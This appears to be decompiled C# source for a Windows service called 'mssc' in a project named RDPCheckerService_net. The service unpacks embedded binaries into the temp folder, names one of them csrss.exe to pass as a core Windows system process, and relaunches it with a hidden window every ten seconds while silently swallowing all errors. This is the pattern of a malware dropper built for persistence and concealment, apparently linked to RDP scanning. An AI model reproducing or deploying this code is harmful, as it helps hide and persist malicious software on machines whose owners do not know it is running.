using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.ServiceProcess;
using System.Threading;
using RDPCheckerService_net.resources;

namespace RDPCheckerService_net;

public class CheckerService : ServiceBase
{
	private IContainer components;

	private static string CHECKER_NAME = "csrss.exe";

	private static string COMPUTER_INFO_CHECKER_NAME = "computer_info.exe";

	private Thread workThread { get; set; }

	private string checkerFilePath { get; set; }

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((ServiceBase)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((ServiceBase)this).set_ServiceName("mssc");
	}

	public CheckerService()
	{
		InitializeComponent();
	}

	protected override void OnStart(string[] args)
	{
		Run();
	}

	protected override void OnStop()
	{
	}

	public void Run()
	{
		workThread = new Thread(ServiceThread);
		workThread.IsBackground = true;
		workThread.Start();
	}

	private bool UnpackCheckerFiles()
	{
		string tempPath = Path.GetTempPath();
		checkerFilePath = Path.Combine(tempPath, CHECKER_NAME);
		string path = Path.Combine(tempPath, COMPUTER_INFO_CHECKER_NAME);
		try
		{
			File.WriteAllBytes(checkerFilePath, ServiceResources.checker);
			File.WriteAllBytes(path, ServiceResources.computer_info);
			return true;
		}
		catch
		{
		}
		return false;
	}

	private void ServiceThread()
	{
		bool flag = true;
		do
		{
			if (UnpackCheckerFiles())
			{
				try
				{
					ProcessStartInfo processStartInfo = new ProcessStartInfo(checkerFilePath);
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					Process.Start(processStartInfo)?.WaitForExit();
				}
				catch
				{
				}
			}
			Thread.Sleep(10000);
		}
		while (flag);
	}
}
